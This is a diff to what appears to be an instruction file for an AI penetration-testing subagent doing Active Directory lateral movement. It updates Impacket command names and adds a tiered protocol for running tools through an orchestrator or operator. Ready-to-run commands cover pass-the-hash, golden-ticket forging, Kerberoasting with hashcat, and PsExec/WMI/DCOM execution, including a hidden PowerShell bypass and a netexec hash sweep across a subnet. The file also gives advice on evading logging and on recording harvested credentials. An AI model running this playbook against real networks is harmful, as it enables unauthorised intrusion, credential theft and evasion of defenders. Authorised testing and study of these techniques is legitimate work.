@@ -79,10 +79,10 @@ Pass-the-hash uses NTLM hashes directly for authentication without needing the p
 
 With Impacket tools:
 ```
-psexec.py -hashes :<NT-hash> <domain>/<user>@<target>
-wmiexec.py -hashes :<NT-hash> <domain>/<user>@<target>
-smbexec.py -hashes :<NT-hash> <domain>/<user>@<target>
-atexec.py -hashes :<NT-hash> <domain>/<user>@<target> "<command>"
+impacket-psexec -hashes :<NT-hash> <domain>/<user>@<target>
+impacket-wmiexec -hashes :<NT-hash> <domain>/<user>@<target>
+impacket-smbexec -hashes :<NT-hash> <domain>/<user>@<target>
+impacket-atexec -hashes :<NT-hash> <domain>/<user>@<target> "<command>"
 ```
 
 With NetExec for testing access:
@@ -117,9 +117,9 @@ psexec.py -k -no-pass <domain>/<user>@<target>
 If you have the KRBTGT hash (from a DCSync or NTDS.dit extraction), you can forge a Kerberos ticket for any user including Domain Admin. This is the most powerful persistence mechanism in an AD environment because it survives password changes for every account except KRBTGT itself.
 
 ```
-ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-SID> -domain <domain> Administrator
+impacket-ticketer -nthash <krbtgt-hash> -domain-sid <domain-SID> -domain <domain> Administrator
 export KRB5CCNAME=Administrator.ccache
-psexec.py -k -no-pass <domain>/Administrator@<DC>
+impacket-psexec -k -no-pass <domain>/Administrator@<DC>
 ```
 
 ### Kerberoasting
@@ -127,7 +127,7 @@ psexec.py -k -no-pass <domain>/Administrator@<DC>
 If you have any domain user credentials, you can request service tickets for accounts with SPNs and crack them offline. This often yields service account passwords, which frequently have admin privileges:
 
 ```
-GetUserSPNs.py <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.txt
+impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <DC-IP> -request -outputfile kerberoast.txt
 hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -157,8 +157,8 @@ WinRM is preferred over PSExec because it generates fewer artifacts (no service 
 PsExec works by creating and starting a service on the remote host. It is effective but noisy — it creates Event ID 4697 (service installation) and Event ID 7045 (new service). Use it when speed matters more than stealth.
 
 ```
-psexec.py <domain>/<user>:<password>@<target>
-psexec.py -hashes :<NT-hash> <domain>/<user>@<target>
+impacket-psexec <domain>/<user>:<password>@<target>
+impacket-psexec -hashes :<NT-hash> <domain>/<user>@<target>
 ```
 
 ### WMI Lateral Movement
@@ -166,13 +166,13 @@ psexec.py -hashes :<NT-hash> <domain>/<user>@<target>
 WMI-based movement is quieter than PsExec because it doesn't create a service. It uses DCOM for communication, which is less commonly monitored:
 
 ```
-wmiexec.py <domain>/<user>:<password>@<target>
-wmiexec.py -hashes :<NT-hash> <domain>/<user>@<target>
+impacket-wmiexec <domain>/<user>:<password>@<target>
+impacket-wmiexec -hashes :<NT-hash> <domain>/<user>@<target>
 ```
 
 For fire-and-forget command execution:
 ```
-atexec.py <domain>/<user>:<password>@<target> "powershell -ep bypass -w hidden -c \"<command>\""
+impacket-atexec <domain>/<user>:<password>@<target> "powershell -ep bypass -w hidden -c \"<command>\""
 ```
 
 ### DCOM Lateral Movement
@@ -180,7 +180,7 @@ atexec.py <domain>/<user>:<password>@<target> "powershell -ep bypass -w hidden -
 DCOM is less commonly monitored than SMB-based techniques. Use the MMC20.Application DCOM object for code execution:
 
 ```
-dcomexec.py <domain>/<user>:<password>@<target>
+impacket-dcomexec <domain>/<user>:<password>@<target>
 ```
 
 ### RDP
@@ -264,3 +264,31 @@ After EVERY credential harvest (SAM dump, LSASS dump, LSA secrets, Kerberos tick
 ```
 
 Do NOT defer this step. Credentials not recorded in CREDENTIALS.md are invisible to other agents and will not be used for further credential reuse analysis.
+
+## MCP Availability — Tiered Fallback Protocol
+
+At session start, determine which MCP access tier applies to you. Your behavior must adapt accordingly.
+
+**Tier 1 — Direct MCP access (mcp__kali-server tools available in your session):**
+Proceed normally. Call mcp__kali-server__execute_command, mcp__kali-server__nmap_scan, and other MCP tools directly.
+
+**Tier 2 — No MCP in subagent, but orchestrator has MCP:**
+You cannot call MCP tools yourself. Instead, format every tool-dependent step as an ORCHESTRATOR-EXECUTE block. The orchestrator will run the MCP tool and pass results back to you.
+
+Example:
+```
+ORCHESTRATOR-EXECUTE: mcp__kali-server__execute_command
+  command: netexec smb 10.100.114.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --continue-on-success
+```
+
+Continue your lateral movement planning by requesting results via ORCHESTRATOR-EXECUTE blocks. Do not attempt to call mcp__kali-server tools directly — they will fail silently or error.
+
+**Tier 3 — No MCP access anywhere:**
+Generate manual command equivalents for the operator to run in a terminal. Prefix every command with MANUAL-EXECUTE: so the operator knows to copy and run it themselves.
+
+Example:
+```
+MANUAL-EXECUTE: netexec smb 10.100.114.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' --continue-on-success
+```
+
+Provide the same credential reuse analysis and movement recommendations regardless of tier — only the execution mechanism changes.
